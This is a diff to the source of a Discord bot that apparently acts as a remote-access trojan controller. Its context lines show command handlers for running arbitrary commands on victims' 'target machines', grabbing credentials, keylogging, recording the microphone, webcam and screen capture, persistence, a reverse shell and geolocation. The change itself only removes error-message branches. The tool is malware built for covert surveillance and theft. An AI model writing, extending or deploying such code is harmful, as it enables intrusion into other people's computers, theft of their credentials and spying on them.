@@ -69,7 +69,6 @@ class Bot(commands.Bot):
 
 bot = Bot()
 
-
 @bot.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
 @app_commands.guilds(GUILD)
 async def cmd(ctx: commands.Context, id:int):
@@ -82,12 +81,9 @@ async def cmd(ctx: commands.Context, id:int):
 @app_commands.guilds(GUILD)
 async def cmd(ctx: commands.Context):
     global CURRENT_AGENT 
-    if CURRENT_AGENT != 0:
-        CURRENT_AGENT = 0
-        my_embed = discord.Embed(title=f"Background Agent", color=0x00FF00)
-        await ctx.reply(embed=my_embed)
-    else:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    CURRENT_AGENT = 0
+    my_embed = discord.Embed(title=f"Background Agent", color=0x00FF00)
+    await ctx.reply(embed=my_embed)
 
 @bot.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
 @app_commands.guilds(GUILD)
@@ -102,8 +98,7 @@ async def cmd(ctx: commands.Context, command:str):
             os.remove(path)
         else:
             await ctx.reply("```"+result+"```")
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Run any command on the all online agents")
 @app_commands.guilds(GUILD)
@@ -134,8 +129,7 @@ async def webshot(ctx: commands.Context):
             else:
                 my_embed = discord.Embed(title=f"Error while taking photo to Agent#{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
         
 @bot.hybrid_command(name = "cd", with_app_command = True, description = "Change the current directory on the target machine")
 @app_commands.guilds(GUILD)
@@ -147,8 +141,7 @@ async def cd(ctx: commands.Context, path:str):
         else:
             my_embed = discord.Embed(title=f"Error while changing directory:\n{result}", color=0xFF0000)    
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "process", with_app_command = True, description = "List all the processes running on the target machine")
 @app_commands.guilds(GUILD)
@@ -163,8 +156,7 @@ async def process(ctx: commands.Context):
             os.remove(path)
         else:
             await ctx.reply(f"```\n{result}\n```")
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "upload", with_app_command = True, description = "Upload a file to the agent")
 @app_commands.guilds(GUILD)
@@ -176,8 +168,7 @@ async def upload(ctx: commands.Context, url:str, name:str):
         else:
             my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Take a screenshot of the target machine's screen")
 @app_commands.guilds(GUILD)
@@ -190,8 +181,7 @@ async def screenshot(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "creds", with_app_command = True, description = "Get the credentials of the target machine")
 @app_commands.guilds(GUILD)
@@ -204,8 +194,7 @@ async def creds(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "persistent", with_app_command = True, description = "Make the agent persistent on the target machine")
 @app_commands.guilds(GUILD)
@@ -217,8 +206,7 @@ async def persistent(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "ls", with_app_command = True, description = "List all the current online agents")
 @app_commands.guilds(GUILD)
@@ -240,8 +228,7 @@ async def download(ctx: commands.Context, path:str):
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while downloading from Agent#{ID}:\n{e}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminate the agent")
 @app_commands.guilds(GUILD)
@@ -251,8 +238,7 @@ async def download(ctx: commands.Context):
         await ctx.reply(embed=my_embed)
         await bot.close()        
         sys.exit()
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Delete the agent from the target machine")
 @app_commands.guilds(GUILD)
@@ -264,8 +250,7 @@ async def selfdestruct(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while deleting Agent#{ID}: {result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "location", with_app_command = True, description = "Get the location of the target machine")
 @app_commands.guilds(GUILD)
@@ -282,8 +267,7 @@ async def location(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "revshell", with_app_command = True, description = "Get a reverse shell on the target machine")
 @app_commands.guilds(GUILD)
@@ -293,8 +277,7 @@ async def location(ctx: commands.Context, ip:str, port:int):
         if result:
             my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
     
 @bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Record the microphone of the target machine")
 @app_commands.guilds(GUILD)
@@ -311,8 +294,7 @@ async def recordmic(ctx: commands.Context, seconds:int):
             else:
                 my_embed = discord.Embed(title=f"Error while starting recording on Agent#{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Change the wallpaper of the target machine")
 @app_commands.guilds(GUILD)
@@ -324,8 +306,7 @@ async def wallpaper(ctx: commands.Context, path_url:str):
         else:
             my_embed = discord.Embed(title=f"Error while changing wallpaper on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "killproc", with_app_command = True, description = "Kill a process on the target machine")
 @app_commands.guilds(GUILD)
@@ -337,8 +318,7 @@ async def killproc(ctx: commands.Context, pid:int):
         else:
             my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "keylog", with_app_command = True, description = "Start a keylogger on the target machine")
 @app_commands.guilds(GUILD)
@@ -351,8 +331,7 @@ async def keylog(ctx: commands.Context, mode:str ,interval:int):
         else:
             threading.Thread(target=logger.start).start()
             await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00))
-    elif CURRENT_AGENT == 0:
-        await ctx.reply(embed=discord.Embed(title=f"Error: Not Interacting with any Agent", color=0xFF0000))
+    
 
 @bot.hybrid_command(name = "help", with_app_command = True, description = "Help menu")
 @app_commands.guilds(GUILD)
